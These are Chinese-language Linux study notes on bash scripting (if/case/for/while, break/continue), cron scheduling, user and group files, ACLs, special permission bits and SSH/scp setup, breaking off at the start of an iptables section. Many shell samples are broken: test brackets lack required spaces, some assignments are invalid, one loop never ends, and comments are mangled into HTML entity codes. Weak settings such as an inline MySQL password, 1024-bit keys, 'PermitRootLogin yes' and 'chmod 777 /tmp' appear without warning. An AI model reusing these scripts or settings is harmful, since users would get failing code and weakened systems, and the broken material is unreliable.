var1 = testing var2 ='' if [-n $var1] then echo &quot;The string '$var1' is not empty.&quot; else echo &quot;The string '$var1' is empty.&quot; fi if [-z $var2] then echo &quot;The string '$var2' is empty.&quot; else echo &quot;The string '$var2' is not empty.&quot; fi #!/bin/bash jump_directory=/home/arthur if [-d $jump_directory] then echo &quot;The $jump_directory directory exists.&quot; else echo &quot;The $jump_directory directory does not exists.&quot; fi 比较 描述 -d file 检查file是否存在并是一个目录 -e file 检查file是否存在 -f file 检查file是否存在并是一个文件 -r file 检查file是否存在并可读 -s file 检查file是否存在并非空 -w file 检查file是否存在并可写 -x file 检查file是否存在并可执行 -O file 检查file是否存在并属当前用户所有 -G file 检查file是否存在并且默认组与当前用户相同 file1 -nt file2 检查file是否比file2 file1 -ot file2 检查file是否比file2旧 复合条件 格式： [condition1] &amp;amp;&amp;amp; [condition2] [condition1] || [condition2] #!/bin/bash # testing compound comparisons # if [-d $HOME] &amp;amp;&amp;amp; [-w $HOME/testing] then echo &quot;The file exists and you can write to it.&quot; else echo &quot;I cannot write to the file.&quot; fi if-then 的高级特性 #!/bin/bash # (( expression )) expression &amp;#21487;&amp;#20197;&amp;#26159;&amp;#20219;&amp;#24847;&amp;#30340;&amp;#25968;&amp;#23398;&amp;#36171;&amp;#20540;&amp;#25110;&amp;#27604;&amp;#36739;&amp;#34920;&amp;#36798;&amp;#24335;&amp;#12290; var1=10 if(( $var1 ** 2 &amp;gt; 90)) then (( $var2 = $var1 ** 2)) echo &quot;The square of $var1 is $var2.&quot; fi #!/bin/bash # [[ expression ]] if[[ $USER == r* ]] then echo &quot;Hello $USER&quot; else echo &quot;Sorry, I do not know you.&quot; fi case 命令 格式： case $变量名 in 模式1) 命令序列1;; 模式2) 命令序列2;; *) 默认执行的命令序列;; esac #!/bin/bash case $action in start | begin) echo &quot;start something&quot; echo &quot;begin something&quot;;; stop | end) echo &quot;stop something&quot; echo &quot;end something&quot;;; *) echo &quot;Ignorant.&quot;;; esac for 命令 格式： for var in list do commands done #!/bin/bash # # basic for command for country in China America India Japen do echo &quot;The next state is $country&quot; done # another example of how not to use the for command # 1.&amp;#20351;&amp;#29992;&amp;#36716;&amp;#20041;&amp;#23383;&amp;#31526;&amp;#65288;&amp;#21453;&amp;#26012;&amp;#32447;&amp;#65289; # 2.&amp;#20351;&amp;#29992;&amp;#21452;&amp;#24341;&amp;#21495; for test in I don\'t know if &quot;this'll&quot; work do echo &quot;word:$test&quot; done # using a variable to hold the list list=&quot;China America India Japen&quot; list=$list&quot; Connecticut&quot; for country in $list do echo &quot;Welcome to $country&quot; done # reading values from a file file=&quot;states&quot; # &amp;#20462;&amp;#25913;IFS&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#30340;&amp;#20540;&amp;#65292;&amp;#20351;&amp;#20854;&amp;#21482;&amp;#33021;&amp;#35782;&amp;#21035;&amp;#25442;&amp;#34892;&amp;#31526; IFS=$'\n' for state in $(cat $file) do echo &quot;Visit beautiful $state&quot; done # iterate through all the files in a directory for file in $HOME/* /etc/nginx/* do if [-d &quot;$file&quot;] then echo &quot;$file is a directory.&quot; elif [-f &quot;$file&quot;] then echo &quot;$file is a file.&quot; fi done # C-style for loop # for (( i=1; i &amp;lt;= 10; i++)) do echo &quot;The next number is $i&quot; done # multiple variable for (( a=1; b=10;a &amp;lt;= 10; a++, b++)) do echo &quot;$a - $b&quot; done while 命令 格式： while test command do other commands done # while command test var1=10 while [ $var1 -gt 0 ] do echo $var1 var1=$[ $var1 - 1 ] done until 命令 until 命令和 while 命令完全相反。 格式： until test command do other commands done 1: #!/bin/bash 2: # using the until command 3: var1=100 4: until [ $var1 -eq 0 ] 5: do 6: echo $var1 7: var1=$[ $var1 -25 ] 8: done 应用 循环处理文件数据-处理 1: #!/bin/bash 2: # changing the IFS value 3: IFS.OLD=$IFS 4: IFS=$'\n' 5: for entry in $(cat /etc/passwd) 6: do 7: echo &quot;Values in $entry -&quot; 8: IFS=: 9: for value in $entry 10: do 11: echo &quot;$value&quot; 12: done 13: done 14: # &amp;#35813;&amp;#33050;&amp;#26412;&amp;#20351;&amp;#29992;&amp;#20102;&amp;#20004;&amp;#20010;&amp;#19981;&amp;#21516;&amp;#30340; IFS &amp;#30340;&amp;#20540;&amp;#26469;&amp;#35299;&amp;#26512;&amp;#25968;&amp;#25454;&amp;#65292;&amp;#31532;&amp;#19968;&amp;#20010; IFS &amp;#20540;&amp;#35299;&amp;#26512;&amp;#20986; /etc/passwd &amp;#25991;&amp;#20214;&amp;#20013;&amp;#30340;&amp;#21333;&amp;#29420;&amp;#30340;&amp;#34892;&amp;#65292;&amp;#20869;&amp;#37096; for &amp;#24490;&amp;#29615;&amp;#25509;&amp;#30528;&amp;#23558; IFS &amp;#30340;&amp;#20540;&amp;#20462;&amp;#25913;&amp;#20026;&amp;#20882;&amp;#21495;&amp;#65292;&amp;#20801;&amp;#35768;&amp;#20320;&amp;#20174; /etc/passwd &amp;#30340;&amp;#34892;&amp;#20013;&amp;#35299;&amp;#26512;&amp;#20986;&amp;#21333;&amp;#29420;&amp;#30340;&amp;#20540;&amp;#12290; break 命令 1: #!/bin/bash 2: # -------------------------------- 3: # &amp;#36339;&amp;#20986;&amp;#21333;&amp;#20010;&amp;#24490;&amp;#29615; 4: # 1.breaking out of a for loop 5: for var1 in 1 2 3 4 5 6: do 7: if [ $var1 -eq 5] 8: then 9: break 10: fi 11: echo &quot;Iteration number: $var1&quot; 12: done 13: echo &quot;The for loop is completed&quot; 14: # 2.breaking out of a while loop 15: var1=1 16: while [ $var1 -lt 10 ] 17: do 18: if [ $var1 -eq 5] 19: then 20: break 21: fi 22: echo &quot;Iteration number: $var1&quot; 23: done 24: echo &quot;The while loop is completed&quot; 25: # -------------------------------- 26: # &amp;#36339;&amp;#20986;&amp;#20869;&amp;#37096;&amp;#24490;&amp;#29615; 27: # 3.breaking out of an inner loop 28: for(( a = 1; a&amp;lt;4; a++)) 29: do 30: echo &quot;Outer loop: $a&quot; 31: for((b = 1; b&amp;lt;100; b++)) 32: do 33: if [ $var1 -eq 5] 34: then 35: break 36: fi 37: echo &quot;Inner loop: $b&quot; 38: done 39: done 40: # --------------------------------- 41: # &amp;#36339;&amp;#20986;&amp;#22806;&amp;#37096;&amp;#24490;&amp;#29615; 42: # 4.breaking out of an outer loop 43: for(( a = 1; a&amp;lt;4; a++)) 44: do 45: echo &quot;Outer loop: $a&quot; 46: for((b = 1; b&amp;lt;100; b++)) 47: do 48: if [ $var1 -eq 5] 49: then 50: break 2 51: fi 52: echo &quot;Inner loop: $b&quot; 53: done 54: done continue 命令 1: # 1.using the continue command 2: for((var1 = 1; var1&amp;lt;15; var1++)) 3: do 4: if [$var1 -gt 5] &amp;amp;&amp;amp; [$var1 -lt 10] 5: then 6: continue 7: fi 8: echo &quot;Iteration number: $var1&quot; 9: done 10: # 2.improperly using the continue command in a while loop 11: var1=1 12: while echo &quot;while iteration: $var1&quot; 13: [ $var1 -lt 15 ] 14: do 15: if [ $var1 -gt 5] &amp;amp;&amp;amp; [$var1 -lt 10] 16: then 17: continue 18: fi 19: echo &quot;Inside iteration number: $var1&quot; 20: var1 = $[$var1 +1] 21: done 22: # 3.continuing an outer loop 23: for(( a = 1; a&amp;lt;5; a++)) 24: do 25: echo &quot;Interation : $a&quot; 26: for((b = 1; b&amp;lt;3; b++)) 27: do 28: if [ $b -gt 2] &amp;amp;&amp;amp; [$a -lt 4] 29: then 30: continue 2 31: fi 32: var3=$[$a+$b] 33: echo &quot;The result of $a * $b is $var3&quot; 34: done 35: done 处理循环的输出 可以对循环的输出使用管道或进行重定向，通过在 done 命令之后添加一个处理命令来实现： for file in /home/zrg/* do ... done &amp;gt; output.txt 实例 #!/bin/bash # finding files in the PATH IF=: for folder in $PATH do echo &quot;$folder:&quot; for file in $folder/* do if [-x $file] then echo &quot;$file&quot; fi done done #!/bin/bash # process new user accounts input = &quot;users.csv&quot; while IFS=',' read -r userid name do echo &quot;adding $userid&quot; useradd -c &quot;$name&quot; -m $userid done &amp;lt; &quot;$input&quot; 4.3.4 控制脚本 4.3.5 创建函数 4.3.6 使用其他 shell 4.4 实用的脚本示例 4.4.1 编写简单的脚本实用工具 归档 管理用户账户 检测磁盘空间 4.4.2 创建与数据库、Web及E-Mail相关的脚本 4.4.3 一些小意思的脚本 发送消息 获取格言 编造借口 在当前目录及指定子目录深度下创建.gitignore文件 #!/bin/sh for dir in `find ./ -mindepth 2 -maxdepth 4 -type d` do echo $dir `touch $dir/.gitignore` echo &quot;*&quot;&amp;gt;$dir/.gitignore done 解决 dpkg: warning: files list file for package 'x' missing Listing 1: for package in $(sudo apt install catdoc 2&amp;amp;1 |grep &quot;warning: files list file for package'&quot; |grep -Po &quot;[^'\n ]+'&quot; |grep -Po &quot;[^']+&quot;); do sudo apt install --reinstall &quot;$package&quot; done 4.4.4 删除大文件的前n行 Listing 2: 示例：删除前10行tail -n +10 old_file&amp;gt;new_file mv new_file old_file 5 Linux Advanced 5.1 Linux User 5.1.1 Linux User /etc/passwd $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ... zrg:x:1000:1000:zrg,,,:/home/zrg:/bin/bash /etc/passwd 文件的字段包含如下信息： 登录用户名 用户密码 UID Group ID 描述 HOME目录位置 默认shell /etc/passwd 文件中的密码字段都被设置成了x，多数Linux系统都将用户密码保存在/etc/shadow文件中，只有特定的程序（比如登录程序）才能访问这个文件。 一般情况下，不建议直接手动在/etc/passwd文件里进行用户管理（比如添加、修改或删除用户账户）。用标准的Linux用户管理工具去执行这些操作就会安全许多。 /etc/shadow /etc/shadow 文件的每条记录都有9个字段： 与/etc/passwd文件对应的登录名 加密后的密码 自上次修改密码后过去的天数密码（自1970年1月1日开始计算） 多少天后才能更改密码 多少天后必须更改密码 密码过期前提前多少天提醒用户更改密码 密码过期后多少天禁用用户帐目 用户账户被禁用的日期（用自1970年1月1日到当天的天数表示） 预留字段给将来使用 用户管理文件 Home 目录 超级用户：/root/ 普通用户：/home/zrg/ var/spool/mail/zrg 用户邮箱目录 /etc/skel 在创建用户时，默认复制该目录下的文件到用户的家目录。 新增、删除和修改用户 //新增用户 $ sudo useradd -D or $ sudo less /etc/default/useradd See below, the subsection &quot;Changing the default values&quot;. GROUP=100 //用户默认组，新用户被添加到GID为100的公共组 HOME=/home //HOME目录位置 INACTIVE=-1 //密码过期宽限天数，密码过期后不会被禁用 EXPIRE= //密码失效时间，未被设置过期日期，密码失效与 /etc/login.defs 默认文件相关。 SHELL=/bin/sh //将sh作为默认shell SKEL=/etc/skel //模板目录，会将/etc/skel目录下的内容复制到用户的HOME目录下 CREATE_MAIL_SPOOL=no //是否为该用户账户在mail目录下创建一个用于接收邮件的文件 //用上面的默认系统参数创建一个新用户账户 $ sudo useradd test //要想在创建用户时改变默认值或默认行为，可以使用命令参数，比如: $ sudo useradd -u 666 -G root,bin -c &quot;test user&quot; -d /home/test -s /bin/bash test //删除用户 默认情况下，userdel命令只会删除/etc/passwd文件中的用户信息，而不会删除系统中属于该账户的任何文件。 $ userdel -r test 加上-r参数，userdel会删除用户的HOME目录以及邮件目录，但必须在删除之前检查清楚（比如是否存放了其他用户或其他程序要使用的重要文件） //修改用户 Table 28: 用户账户修改工具 命令 描述 usermod 修改用户账户的字段，指定主要组以及附加组的所属关系 passwd 修改已有用户的密码 chpasswd 从文件中读取登录名密码对，并更新密码 chage 修改密码的过期时间 chfn 修改用户账户的备注信息 chsh 修改用户账户的默认登录shell 修改密码 修改用户密码的命令：passwd -S 查询用户密码的状态，仅root用户可用。 -l 暂时锁定用户。仅root用户可用。 -u 解锁用户。仅root用户可用。 &amp;#x2013;stdin 通过管道符输出的数据作为用户的密码。 5.1.2 Linux Group /etc/group /etc/group文件有4个字段： 组名 组密码 GID 属于该组的用户列表，当一个用户在/etc/passwd文件中指定某个组作为默认组时，用户账户不会作为该组成员再出现在/etc/group文件中。 /etc/gshadow /etc/group的加密资讯文件，比如用户组（Group）管理密码就是存放在这个文件。 /etc/gshadow和/etc/group是互补的两个文件；对于大型服务器，针对很多用户和组，定制一些关系结构比较复杂的权限模型，设置用户组密码是极有 必要的。比如我们不想让一些非用户组成员永久拥有用户组的权限和特性，这时我们可以通过密码验证的方式来让某些用户临时拥有一些用户组特性， 这时就要用到用户组密码。 $ sudo less /etc/gshadow 组名：用户组的名称，由字母或数字构成。 口令：用户组密码，这个段可以是空的或!，如果是空的或有!，表示没有密码。 组管理者：这个字段也可为空，如果有多个用户组管理者，用,号分割。 组内用户列表：如果有多个成员，用,号分割 ; 创建、修改和删除组 $ sudo groupadd shared $ sudo groupmod -n sharing shared $ sudo groupdel shared 加入组和从组里删除 $ sudo gpasswd -a test tests $ sudo gpasswd -d test tests 5.2 Linux Access Control 5.2.1 Linux 细部权限规划：ACL 权限控制 什么是 ACL？ ACL 是 Access Control List 的缩写，主要的目的是在提供传统的 owner,group,others 的 read,write,execute 权限之外的细部权限配置。 ACL 主要可以针对哪些方面来控制权限呢？它主要可以针对以下几个项目： 使用者 (user)：可以针对使用者来配置权限； 群组 (group)：针对群组为对象来配置其权限； 默认属性 (mask)：还可以针对在该目录下在创建新文件/目录时，规范新数据的默认权限； 如何开启 ACL？ 查看 /dev/sdb1 分区 ACL 权限是否开启。 $ sudo dumpe2fs -h /dev/sdb1 //找到&quot;Default mount options&quot;，查看是否有临时开启分区 ACL 权限 重新挂载根分区，并挂载加入 acl 权限。 $ sudo mount -o remount,acl / 永久开启分区 ACL 权限 $ sudo vim /etc/fstab UUID=e50dea0a-bcb6-4921-8762-dd96782846dd / ext4 defaults,acl 0 1 注意：目前多数 Linux 系统 defaults 默认已经支持 acl 开启了，所以只需要添加 defaults 选项就可以了。重新挂载文件系统或重启系统，使修改生效。 $ sudo mount -o remount / 设定 ACL 权限 使用 setfacl 命令设定 ACL 权限 示例：构建听课权限组，为特定用户设定 ACL 权限 # useradd wang # useradd li # useradd zhao # groupadd coursegroup # mkdir /project # chown root:coursegroup /project/ # chmod 770 /project # setfacl -m u:zhao:rwx /project 使用 getfacl 命令获取 ACL 设定信息 格式: getfacl filename # getfacl abc.txt 针对有效权限(effective permission) mask 的设定 有效权限 : 使用者或群组所配置的权限必须要存在于 mask 的权限配置范围内才会生效。 配置规范：『 m:[rwx] 』，例如针对某个文件规范为仅有 rx ： # setfacl -m m:rx /project/testfile 针对默认权限和递归(针对目录/子目录下的所有文件)权限的设定 配置规范：『 d:[ug]:使用者列表:[rwx] 』 # setfacl -m d:u:zhao:rx -R /project 5.2.2 Linux 文件特殊权限 SetUID SetUID 介绍 只有可执行的二进制程序才能设定 SUID 权限； 用户拥有该程序的可执行权限； 在执行该程序时,获得该程序文件所属用户的身份； SetUID 只在该程序执行过程中有效. 设定和取消 SetUID // 查看 passwd 命令的 SetUID $ ll /usr/bin/passwd -rwsr-xr-x 1 root root 59640 3月 23 03:05 /usr/bin/passwd* // 设定 $ sudo chmod 4755 abc.txt or $ sudo chmod u+s abc.txt // 取消 $ sudo chmod 755 abc.txt $ sudo chmod u-s abc.txt 注意事项 关键目录应严格控制写权限.如&quot;/&quot;,&quot;/usr&quot; 对系统中默认应该具有 SetUID 权限的文件的统一列表,定期检查. SetGID SetGID 介绍 只有可执行的二进制程序才能设定 SUID 权限； 用户拥有该程序的可执行权限； 在执行该程序时,获得该程序文件所属组的身份； SetGID 只在该程序执行过程中有效. 设定 SetGID $ sudo chmod 2755 abc.txt $ sudo chmod g+s abc.txt SetGID 针对目录的作用 普通用户必须对此目录拥有r和x权限,才能进入次目录； 普通用户在此目录中的有效组会变成次目录的属组； 若普通用户对此目录拥有w权限,新建的文件默认属组是这个目录的属组. Stiky BIT Stiky BIT 粘着位 粘着位只对目录有效 普通用户对该目录有w和x权限 如果没有粘着位,普通用户可以删除此目录下所有文件, 一旦赋予了粘着位,除了root用户可以删除所有文件,普通用户只能删除自己建立的文件 设定 Stiky BIT $ ll /tmp drwxrwxrwt 20 root root 12288 7月 6 18:02 ./ $ sudo chmod 1755 /tmp $ sudo chmod o+t /tmp $ sudo chmod 777 /tmp $ sudo chmod o-t /tmp chattr 命令格式 chattr [+-=] 选项 file/directory + 新增权限 - 删除权限 = 等于某权限 // 查看文件chattr属性 格式: lsattr 选项 file/directory $ lsattr abc.txt 选项 i对文件: 不允许进行删除或改名, 也不能添加或修改数据; 对目录: 只能修改目录下文件的数据, 但不允许建立和删除文件. a对文件: 只能在文件中添加数据, 但不能删除或修改数据; 对目录: 只允许创建或修改文件, 但不允许删除文件. 5.3 Linux Server 5.4 Linux System Resource 5.4.1 进程管理 常见进程管理命令 top list the processes running on the system // 查看 $ ps -ef send a signal to one or more processes (usually to &quot;kill&quot; a process) an alternate way of listing your own processes put a process in the background put a process in the forground 5.4.2 系统资源监控 5.4.3 例行性工作排程：系统定时任务 对于 Linux 用户 你肯定希望： 每一天早上 8:00 钟，让电脑连接上音响，并播放音乐来唤你起床； 而中午 12:00 希望 Linux 可以发一封信到你的邮件信箱，提醒你可以去吃午餐了； 另外，在每年你爱人生日的前一天，先发封信提醒你，以免忘记这么重要的一天。 crontab 简单介绍 crontab 命令的功能是在一定的时间间隔调度一些命令的执行。 /etc/crontab 文件 在 /etc 目录下有一个 crontab 文件，这里存放有系统运行的一些调度程序。每个用户可以建立自己的调度 crontab(在 /var/spool/cron 目录下)。 cron 服务每分钟不仅要读一次 /var/spool/cron 内的所有文件，还需要读一次 /etc/crontab，因此我们配置这个文件也能运用 cron 服务做一些事情。 用 crontab 配置是针对某个用户的，而编辑 /etc/crontab 是针对系统的任务。 crontab 文件格式如下： SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root #&amp;#22914;&amp;#26524;&amp;#20986;&amp;#29616;&amp;#38169;&amp;#35823;&amp;#65292;&amp;#25110;&amp;#32773;&amp;#26377;&amp;#25968;&amp;#25454;&amp;#36755;&amp;#20986;&amp;#65292;&amp;#25968;&amp;#25454;&amp;#20316;&amp;#20026;&amp;#37038;&amp;#20214;&amp;#21457;&amp;#32473;&amp;#36825;&amp;#20010;&amp;#24080;&amp;#21495; HOME=/ #&amp;#20351;&amp;#29992;&amp;#32773;&amp;#36816;&amp;#34892;&amp;#30340;&amp;#36335;&amp;#24452;,&amp;#36825;&amp;#37324;&amp;#26159;&amp;#26681;&amp;#30446;&amp;#24405; # run-parts 注意到&quot;run-parts&quot;这个参数，后面可以写要运行的某个脚本。 另外： /usr/lib/cron/cron.allow 表示谁能使用 crontab 命令。如果它是一个空文件表明没有一个用户能安排作业。如果这个文件不存在，而有另外一个文件。 /usr/lib/cron/cron.deny,则只有不包括在这个文件中的用户才可以使用 crontab 命令。如果它是一个空文件表明任何用户都可安排作业。两个文件同时存在时，cron.allow 优先，如果都不存在，只有超级用户可以安排作业。 crontab 基本格式 Table 29: 格式 \ * * * * * commond 代表意思 分 时 日 月 周 &amp;#xa0; 范 围 (0-59) (0-23) (1-31) (1-12) (0-6) &amp;#xa0; “ * ”表示任意时刻 “ , ”表示分割 “ - ”表示一个段 “ /n ”表示每 n 的单位执行一次 命令后面加上 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 ,标准错误重定向到标准输出 实例1：实现两个周备份一次 /var/ftp 目录下的内容 具体实现方法如下: a.先新建一个 txt 文件，这里是 ftp-back-shell.txt，文件内容： * * 14 * * cd /back/ftp-back/ &amp;amp;&amp;amp; rsync -avzc /var/ftp ./ b.将 ftp-back.txt 文件放到 /opt/ftp-back/ 目录下 c.运行： $ crontab /opt/ftp-back/ftp-back.txt $ crontab -l d.需要进行重启，配置文件生效： sudo systemctl restart crond.service 实例2：实现定时插入数据 新建 crontab.sh 脚本文件 $ vim crontab.sh #!/bin/sh /usr/bin/php /home/zrg/.crontab/crontab.php 编辑 php 文件 设置定时任务 $ crontab -e */2 * * * * /bin/bash /home/zrg/.crontab/crontab.sh 查看定时任务 $ crontab -l 重启服务使生效：sudo systemctl restart cron.service 移除定时服务 $ crontab -r 示例3：备份 mysql 数据 $ sudo vim cron.sh #!/bin/sh filename=`date +%Y%m%d%H%M%S` mysqldump -u root -proot testdb&amp;gt;/home/zrg/crontab/$filename.sql $ crontab -e 0 2 * * * /bin/bash /home/zrg/crontab/cron.sh $rccron reload 一些简单示例 43 21 * * * 21:43 执行 0 17 * * 1 每周一的 17:00 执行 0,10 17 * * 0,2,3 每周日,周二,周三的 17:00和 17:10 执行 0-10 17 1 * * 毎月1日从 17:00到17:10 毎隔1分钟 执行 */10 * * * * 　　　　　　 每隔10分 执行 0,10,20,30,40,50 * * * *　每隔10分 执行 2 8-20/3 * * *　　　　　　8:02,11:02,14:02,17:02,20:02 执行 5.4.4 远程管理：SSH、VNC SSH &amp;amp; OpenSSH &amp;amp; SSL &amp;amp; OpenSSL SSL(Secure Sockets Layer)，是网络通信提供安全及数据完整性的一种安全协议，它涉及所有TC/IP应用程序。SSL协议使用通讯双方的客户证书以及CA根证书，允许客户/服务器应用以一种不能被偷听的方式通讯，在通讯双方间建立起了一条安全的、可信任的通讯通道。它具备以下基本特征：信息保密性、信息完整性、相互鉴定。 主要用于提高应用程序之间数据的安全系数。 OpenSSL，对SSL的实现。 SSH(Secure Shell)，意为“安全外壳协议”，是一种可以为远程登录提供安全保障的协议。使用SSH，可以把所有传输的数据进行加密，“中间人”攻击方式就不可能实现，能防止DNS欺骗和IP欺骗。 OpenSSH，对SSH的实现。依赖于OpenSSL，没有OpenSSL的话OpenSSH就编译不过去，也运行不了。 HTTPS(Hypertext Transfer Protocol Secure，超文本传输安全协议)，是一种透过计算器网上进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。 ssh 配置 配置持久连接 服务端 $ sudo vim /etc/ssh/sshd_config #server&amp;#27599;&amp;#38548;60&amp;#31186;&amp;#21457;&amp;#36865;&amp;#19968;&amp;#27425;&amp;#35831;&amp;#27714;&amp;#32473;client&amp;#65292;&amp;#28982;&amp;#21518;client&amp;#21709;&amp;#24212;&amp;#65292;&amp;#20174;&amp;#32780;&amp;#20445;&amp;#25345;&amp;#36830;&amp;#25509; ClientAliveInterval 60 #server&amp;#21457;&amp;#20986;&amp;#35831;&amp;#27714;&amp;#21518;&amp;#65292;&amp;#23458;&amp;#25143;&amp;#31471;&amp;#27809;&amp;#26377;&amp;#21709;&amp;#24212;&amp;#24471;&amp;#27425;&amp;#25968;&amp;#36798;&amp;#21040;3&amp;#65292;&amp;#23601;&amp;#33258;&amp;#21160;&amp;#26029;&amp;#24320;&amp;#36830;&amp;#25509;&amp;#65292;&amp;#27491;&amp;#24120;&amp;#24773;&amp;#20917;&amp;#19979;&amp;#65292;client&amp;#19981;&amp;#20250;&amp;#19981;&amp;#21709;&amp;#24212;&amp;#12290; ClientAliveCountMax 3 客户端 $ sudo vim /etc/ssh/ssh_config #server&amp;#27599;&amp;#38548;60&amp;#31186;&amp;#21457;&amp;#36865;&amp;#19968;&amp;#27425;&amp;#35831;&amp;#27714;&amp;#32473;client&amp;#65292;&amp;#28982;&amp;#21518;client&amp;#21709;&amp;#24212;&amp;#65292;&amp;#20174;&amp;#32780;&amp;#20445;&amp;#25345;&amp;#36830;&amp;#25509; ServerAliveInterval 60 #server&amp;#21457;&amp;#20986;&amp;#35831;&amp;#27714;&amp;#21518;&amp;#65292;&amp;#23458;&amp;#25143;&amp;#31471;&amp;#27809;&amp;#26377;&amp;#21709;&amp;#24212;&amp;#24471;&amp;#27425;&amp;#25968;&amp;#36798;&amp;#21040;3&amp;#65292;&amp;#23601;&amp;#33258;&amp;#21160;&amp;#26029;&amp;#24320;&amp;#36830;&amp;#25509;&amp;#65292;&amp;#27491;&amp;#24120;&amp;#24773;&amp;#20917;&amp;#19979;&amp;#65292;client&amp;#19981;&amp;#20250;&amp;#19981;&amp;#21709;&amp;#24212;&amp;#12290; ServerAliveCountMax 3 使用OpenSSL生成密钥对 生成私钥 $ openssl genrsa -out rsa_private_key.pem 1024 参数:genrsa 生成密钥 -out 输出到文件 rsa_private_key.pem 文件名 1024 长度 从私钥中提取公钥 $ openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem 参数: rsa 提取公钥 -in 从文件中读入 rsa_private_key.pem 文件名 -pubout 输出 -out 到文件 rsa_public_key.pem 文件名 修改ssh默认端口号 首先修改配置文件： $ vim /etc/ssh/sshd_config Port 22 Port 6666 注意： 这里添加6666端口，测试成功连接后，再去除22端口配置。这样可以避免修改不成功无法正常登录。 所修改的端口需要事先查明未被其他服务占用，以免造成不可估计的后果！ 重启ssh和防火墙 $ systemctl restart iptables $ systemctl restart sshd 假如要限制SSH登陆的IP，那么可以如下做： 首先：修改/etc/hosts.deny，在其中加入sshd:ALL 然后：修改：/etc/hosts.allow，在其中进行如下设置：sshd:192.168.1.1：deny  （192.168.1.*） 这样就可以限制只有192.168.1.1的IP通过SSH登陆上LINUX机器了。 通过密钥登录服务器 生成密钥对 $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/zrg/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/zrg/.ssh/id_rsa. Your public key has been saved in /home/zrg/.ssh/id_rsa.pub. The key fingerprint is: SHA256:OEEJVicOORWU5awcPz7oYPtldQwQXdwuPFyUcVY0umU zrg@DESKTOP-5IIDIKQ The key's randomart image is: +---[RSA 2048]----+ | +*B==o o.oo=*| | .o+o= .. . =o.| | .+ o .o + E | | . * o= = | | = S . o+ | | + o . | | o . = | | . + o . | | ..o | +----[SHA256]-----+ 在服务器上配置上公钥 $ cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; authorized_keys $ chmod 600 ~/.ssh/authorized_keys $ chmod 700 ~/.ssh 配置ssh，打开密钥登录功能 $ vim /etc/ssh/sshd_config RSAAuthentication yes PubkeyAuthentication yes PermitRootLogin yes //root &amp;#29992;&amp;#25143;&amp;#33021;&amp;#21542;&amp;#36890;&amp;#36807; SSH &amp;#30331;&amp;#24405; PasswordAuthentication no //&amp;#24403;&amp;#23436;&amp;#25104;&amp;#20840;&amp;#37096;&amp;#35774;&amp;#32622;&amp;#65292;&amp;#20197;&amp;#23494;&amp;#38053;&amp;#26041;&amp;#24335;&amp;#30331;&amp;#24405;&amp;#25104;&amp;#21151;&amp;#21518;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#31105;&amp;#29992;&amp;#23494;&amp;#30721;&amp;#30331;&amp;#24405;&amp;#65306; 重启ssh服务 $ systemctl restart sshd.service 使用scp上传或下载文件 从服务器上下载文件 $ scp username@servername:/path/filename /var/www/local_dir（本地目录） 示例：scp root@192.168.0.101:/var/www/test.txt 把 192.168.0.101 上的 /var/www/test.txt 的文件下载到 /var/www/local_dir（本地目录） 上传本地文件到服务器 $ scp /path/filename username@servername:/path 例如 scp /var/www/test.php root@192.168.0.101:/var/www/ 把本机 /var/www/ 目录下的 test.php 文件上传到 192.168.0.101 这台服务器上的 /var/www/ 目录中 从服务器下载整个目录 $ scp -r username@servername:/var/www/remote_dir/（远程目录） /var/www/local_dir（本地目录） 例如：scp -r root@192.168.0.101:/var/www/test /var/www/ 上传目录到服务器 $ scp -r local_dir username@servername:remote_dir 例如：scp -r test root@192.168.0.101:/var/www/ 把当前目录下的test目录上传到服务器的 /var/www/ 目录 5.4.5 防火墙：iptables &amp;amp; firewalld 工具 防火墙管理工具 众所周知，企业内网和外部公网相比，外部的公网环境更加恶劣，罪恶丛生。在公网与企业内网之间充当保护屏障的防火墙（见下图所示）虽然有软件或硬件之分，但主要功能都是依据策略对穿越防火墙自身的流量进行过滤。防火墙策略可以基于流量的源地址、端口号、协议、应用等信息来定制，然后防火墙使用预先定制的策略规则监控出入的流量，若流量与某一条策略规则相匹配，则执行相应的处理，反之则丢弃。这样一来，就可以保证仅有合法的流量在企业内网和外部公网之间流动了。 目前在RHEL 7系统中，firewalld防火墙取代了iptables防火墙。其实，iptables与firewalld都不是真正的防火墙，它们都只是用来定义防火墙策略的防火墙管理工具而已，或者说，它们只是一种服务。与 Linux 内核集成的 IP 信息包过滤系统。防火墙在做数据包过滤决定时，有一套遵循和组成的规则，这些规则存储在专用的数据包过滤表中，而这些表集成在 Linux 内核中。 iptables服务会把配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而firewalld服务则是把配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。换句话说，当前在Linux系统中其实存在多个防火墙管理工具，旨在方便运维人员管理Linux系统中的防火墙策略，我们只需要配置妥当其中的一个就足够了。虽然这些工具各有优劣，但它们在防火墙策略的配置思路上是保持一致的。 netfilter 组件也称为内核空间（kernelspace），是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。 iptables 组件是一种工具，也称为用户空间（userspace），它使插入、修改和除去信息包过滤表中的规则变得容易。 iptables 在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。 策略与规则链 防火墙会从上至下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作并去执行匹配项中定义的行为（即放行或阻止）。如果在读取完所有的策略规则之后没有匹配项，就去执行默认的策略。防火墙策略规则的设置有两种：一种是“通”（即放行），一种是“堵”（即阻止iptables服务把用于处理或过滤流量的策略条目称之为规则，多条规则可以组成一个规则链，而规则链则依据数据包处理位置的不同进行分类，具体如下： 在进行路由选择前处理数据包（PREROUTING）； 处理流入的数据包（INPUT）； 